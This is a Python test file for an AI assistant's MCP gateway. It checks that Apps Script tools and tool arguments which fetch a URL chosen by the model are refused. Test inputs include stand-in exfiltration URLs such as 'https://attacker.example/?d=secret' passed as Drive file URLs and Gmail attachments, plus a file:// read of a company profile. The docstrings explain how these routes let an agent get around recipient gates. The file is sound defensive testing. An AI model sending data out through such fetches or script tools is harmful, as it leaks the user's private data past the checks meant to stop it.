"""Two refusals that close paths around the recipient gates:

- every Apps Script tool (code running as the Executive's Google account,
  outside the gates — and, since workspace-mcp 1.29.0, schedulable);
- any argument that makes workspace-mcp fetch a URL the model chose
  (Drive `fileUrl` / `file_url`, an attachment given as a `url`): the fetch
  can carry data out in the query string before any recipient gate matters.

Mirrors the structure of test_mcp_gateway_email_egress.py.
"""
from __future__ import annotations

import asyncio
import json
from pathlib import Path
from types import SimpleNamespace
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

import openexecutive.audit
import openexecutive.orchestrator.mcp_gateway as gw_module
from openexecutive.orchestrator.mcp_gateway import MCPGateway
from openexecutive.people import store as people_store

EXEC_ADDR = "ceo@example.com"
ALICE = "alice@example.com"


@pytest.fixture(autouse=True)
def isolated(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    db_path = tmp_path / "people.db"
    monkeypatch.setattr(people_store, "DB_PATH", db_path)
    people_store.initialize_db()
    people_store.upsert_person(full_name="Alice", email=ALICE)
    # Refusals are audited; keep the rows out of the shared default DB.
    monkeypatch.setattr(openexecutive.audit, "log_event", lambda *a, **k: None)


def _make_gateway() -> tuple[MCPGateway, AsyncMock]:
    gateway = MCPGateway()
    session = MagicMock()
    fake_result = MagicMock()
    fake_result.content = [MagicMock(text='{"ok": true}')]
    session.call_tool = AsyncMock(return_value=fake_result)
    gateway._session = session
    return gateway, session.call_tool


def _call(gateway: MCPGateway, tool_name: str, arguments: dict[str, Any]) -> str:
    settings = SimpleNamespace(exec_email_address=EXEC_ADDR, email_poll_interval_seconds=60)
    with patch.object(gw_module, "get_settings", return_value=settings):
        return asyncio.run(gateway.call_tool({"name": tool_name, "arguments": arguments}))


# ---------------------------------------------------------------------------
# Apps Script
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("bare", sorted(
    t[len("google_workspace__"):] for t in gw_module._BLOCKED_APPS_SCRIPT_TOOLS
))
def test_every_known_apps_script_tool_is_refused(bare: str) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, f"google_workspace__{bare}", {"script_id": "abc"})
    assert session_call.await_count == 0
    assert "Apps Script" in json.loads(result)["error"]


@pytest.mark.parametrize("bare", ["manage_script_thing", "list_deployment_targets", "run_script"])
def test_unknown_script_or_deployment_name_is_refused(bare: str) -> None:
    """A rename in a future workspace-mcp must not reopen the path."""
    gateway, session_call = _make_gateway()
    result = _call(gateway, f"google_workspace__{bare}", {})
    assert session_call.await_count == 0
    assert "Apps Script" in json.loads(result)["error"]


@pytest.mark.parametrize("bare", [
    "get_events", "get_doc_content", "search_gmail_messages", "get_drive_file_content",
    "read_sheet_values", "list_calendars",
])
def test_ordinary_workspace_tools_pass(bare: str) -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, f"google_workspace__{bare}", {"x": 1})
    assert session_call.await_count == 1


def test_other_servers_are_not_pattern_matched() -> None:
    """The name pattern is scoped to the google_workspace namespace."""
    gateway, session_call = _make_gateway()
    _call(gateway, "notion__run_script", {})
    assert session_call.await_count == 1


def test_apps_script_refused_before_any_argument_check() -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__run_script_function", {"fileUrl": "https://x/"})
    assert session_call.await_count == 0
    assert "Apps Script" in json.loads(result)["error"]


# ---------------------------------------------------------------------------
# URL fetch arguments on Drive / import tools
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("tool,key", [
    ("google_workspace__create_drive_file", "fileUrl"),
    ("google_workspace__update_drive_file", "file_url"),
    ("google_workspace__import_to_google_doc", "file_url"),
    ("google_workspace__import_to_google_sheets", "file_url"),
    ("google_workspace__import_to_google_slides", "file_url"),
])
def test_url_fetch_argument_refused(tool: str, key: str) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, tool, {"file_name": "a.pdf", key: "https://attacker.example/?d=secret"})
    assert session_call.await_count == 0
    assert "fetch a URL" in json.loads(result)["error"]


def test_file_scheme_refused_too() -> None:
    """create_drive_file.fileUrl accepts file:// — a local read into Drive."""
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__create_drive_file",
                   {"file_name": "env", "fileUrl": "file:///data/company/profile.yaml"})
    assert session_call.await_count == 0
    assert "fetch a URL" in json.loads(result)["error"]


@pytest.mark.parametrize("value", [None, ""])
def test_null_or_empty_url_argument_passes(value: Any) -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__create_drive_file",
          {"file_name": "a.txt", "content": "hello", "fileUrl": value})
    assert session_call.await_count == 1


def test_content_upload_passes() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__create_drive_file",
          {"file_name": "a.txt", "content": "hello", "folder_id": "f1"})
    assert session_call.await_count == 1


@pytest.mark.parametrize("key", ["download_url", "DownloadURL", "source-url", "URL"])
def test_unknown_url_key_on_any_workspace_tool_refused(key: str) -> None:
    """Fails closed against a renamed or new fetch argument."""
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__some_future_tool", {key: "https://x/"})
    assert session_call.await_count == 0
    assert "fetch a URL" in json.loads(result)["error"]


def test_contact_urls_field_is_not_a_fetch() -> None:
    """manage_contact.urls stores a person's websites; nothing is fetched."""
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__manage_contact",
          {"action": "update", "resource_name": "people/1", "urls": ["https://example.com"]})
    assert session_call.await_count == 1


# ---------------------------------------------------------------------------
# Gmail attachments given as a URL
# ---------------------------------------------------------------------------

_MAIL = {"to": ALICE, "subject": "hi", "body": "b"}


@pytest.mark.parametrize("tool", [
    "google_workspace__send_gmail_message", "google_workspace__draft_gmail_message",
])
@pytest.mark.parametrize("attachments", [
    [{"url": "https://attacker.example/?d=secret"}],
    [{"URL": "https://attacker.example/?d=secret", "filename": "a.pdf"}],
    [{"path": "/data/a.pdf"}, {"url": "https://attacker.example/x"}],
    [{"download_url": "https://attacker.example/x"}],
    {"url": "https://attacker.example/x"},
    '[{"url": "https://attacker.example/?d=secret"}]',
    "https://attacker.example/?d=secret",
    ["https://attacker.example/?d=secret"],
    [42],
    "not-json-but-a-URL-word",
])
def test_attachment_by_url_refused(tool: str, attachments: Any) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, tool, {**_MAIL, "attachments": attachments})
    assert session_call.await_count == 0
    assert "attachment" in json.loads(result)["error"].lower()


@pytest.mark.parametrize("attachments", [
    None,
    [],
    [{"path": "/data/a.pdf"}],
    [{"path": "/data/a.pdf", "mime_type": "application/pdf", "url": None}],
    [{"content": "QUJD", "filename": "a.txt"}],
    '[{"path": "/data/a.pdf"}]',
    ["/data/a.pdf"],
])
def test_attachment_by_path_or_content_passes(attachments: Any) -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__send_gmail_message", {**_MAIL, "attachments": attachments})
    assert session_call.await_count == 1


def test_recipient_gate_still_runs_first() -> None:
    """A URL attachment to a stranger is refused for the recipient, as before."""
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__send_gmail_message",
                   {**_MAIL, "to": "stranger@evil.example",
                    "attachments": [{"url": "https://attacker.example/x"}]})
    assert session_call.await_count == 0
    assert "stranger@evil.example" in json.loads(result)["error"]


def test_self_send_with_url_attachment_refused() -> None:
    """The Executive's own address always passes the recipient gate, which is
    exactly why the fetch has to be refused on its own."""
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__send_gmail_message",
                   {**_MAIL, "to": EXEC_ADDR,
                    "attachments": [{"url": "https://attacker.example/?d=secret"}]})
    assert session_call.await_count == 0
    assert "attachment" in json.loads(result)["error"].lower()
